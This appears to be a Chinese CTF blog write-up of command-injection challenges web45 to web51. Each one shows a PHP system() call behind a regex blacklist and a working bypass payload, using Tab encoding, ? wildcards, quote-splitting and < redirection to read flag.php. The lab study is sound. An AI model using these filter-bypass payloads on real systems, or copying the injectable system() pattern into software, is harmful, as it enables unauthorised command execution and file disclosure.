关于为什么这里知道有flag.php文件，其实就是ls查看一下，之后如果ls不被ban,那就默认有这一步操作，不再过多讲述

![image-20261116203021604](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116203021604.png)

---

## web45

```php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这一题在上一题的基础之上又禁了空格

既然空格被禁了，那就试试`%09`Tab

```
?c=tac%09fla*.php
```



![image-20261116204051453](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116204051453.png)

---

## web46

```php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这一题又禁了数字0-9，$ ,和通配符，既然想用`fla*.php`绕过的方法行不通，那就试试`fla?.php`

```
?c=tac%09fla?.php
```



![image-20261116204600364](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116204600364.png)

---

## web47

```php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

相较于上一题这题禁了更多的指令

| 命令 | 作用                                       |
| ---- | ------------------------------------------ |
| cat  | 一次性输出整个文件（上一题已被禁）         |
| more | 分页显示文件（看完一屏按空格翻页）         |
| less | 比 more 更强的分页查看器（可上下翻、搜索） |
| head | 只显示文件开头 N 行                        |
| tail | 只显示文件末尾 N 行                        |
| sort | 按行排序后输出（但它必须先读取文件内容）   |

```
?c=tac%09fla?.php
```



![image-20261116205656290](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116205656290.png)

---

## web48

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```



![image-20261116210316945](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116210316945.png)

---

## web49

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

不知道你们一开始看到这个`%`会不会觉得，哎呀完蛋了，%也被禁了，那又要找一个替代`%09`的东西了，但但但但但，但是，实际上并不是这样的**黑名单里的%实际上禁的是字符串意义上的百分号，比如printf %s这种，并不会禁掉%09里的百分号，因为%09的背后真正含义是Tab,它只是被编码之后成这样的**

```
?c=tac%09fla?.php
```



![image-20261116211021104](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116211021104.png)

---

## web50

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```



| 新增   | 含义                                       | 出题人的动机                                                 |
| :----- | :----------------------------------------- | :----------------------------------------------------------- |
| `\x09` | Tab 字符（解码后的 URL 里的 `%09` 就是它） | 上一题我们用 `%09` 代替空格分隔命令和参数。禁掉 Tab 后，**空格、Tab、`$IFS`（`$` 上题已禁）三个经典参数分隔手段全灭** |
| `\x26` | `&`                                        | `&` 是除 `;` 和换行之外的又一条"命令分隔/后台执行"通路，能把追加的 `>/dev/null 2>&1` 甩开。出题人把它也封了 |



既然`%09`被彻底封住了，那我们就来学习一个新的方法，重定向`<`

### 重定向`<`

**`<`从标准输入读文件，命令和文件名之间不需要任何空白**

如果你在url输入

`?c=tac<fla?g.php||`你会发现返回的是空白

### 为什么返回的是空白呢？明明`?`并没有被禁啊

是这样，由于system是非交互式shell,所以对**重定向的目标文件**不会做统配展开（但这是 POSIX 规范 + dash 实现；bash 会展开，是**例外**，这个意外以后遇到了再学习），也就是说，在这里，`fla?g.php`并不会被展开成，flag.php所以就没办法tac到

对普通函数会展开，对**重定向目标的引号也会展开**

利用：对**重定向目标的引号会统配展开**这一点，可以把式子中的？给替换掉

| 非交互shell对重定向的目标文件 | 不会统配展开 |
| ----------------------------- | ------------ |
| **非交互shell对普通函数**     | **会**       |
| **对引号**                    | **会**       |



```
?c=tac<"fla"g.php||
```

![image-20261116214301691](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261116214301691.png)

---

## web51

```php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

这题更严格了，它把tac给禁了，那我们就两个思路，要么把tac指令换了，要么就想办法绕过，不要让tac这个字符串整个连续出现

### 法一：换成nl

```
?c=nl<"fla"g.php||
```

可能会看到界面返回一个数字1，这时ctrl+u就好了

![image-20261117001614026](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261117001614026.png)

### 法二：绕过tac

既然不能直接写tac那是不是可以用上题，通过双引号绕过flag的思路呢，比如”ta"c

```
?c="ta"c<"fla"g.php||
```

![image-20261117001950215](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261117001950215.png)

## web52

